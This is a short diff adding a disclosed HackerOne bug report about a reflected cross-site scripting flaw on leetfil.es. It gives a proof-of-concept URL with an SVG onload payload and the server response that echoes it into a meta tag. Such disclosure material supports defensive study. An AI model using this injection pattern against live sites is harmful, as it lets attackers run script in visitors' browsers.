@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/147646
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:arxius(arxius)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:02.11.2016 13:37:44
+
+Summary:
+
+**PoC** (Edge, Internet Explorer):
+`https://blackfan.ru/x?r=https://leetfil.es/'><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e`
+
+**HTTP Response**:
+```
+<meta property='og:url' content='https://leetfil.es/'><svg/onload=alert(document.domain)>' />
+```
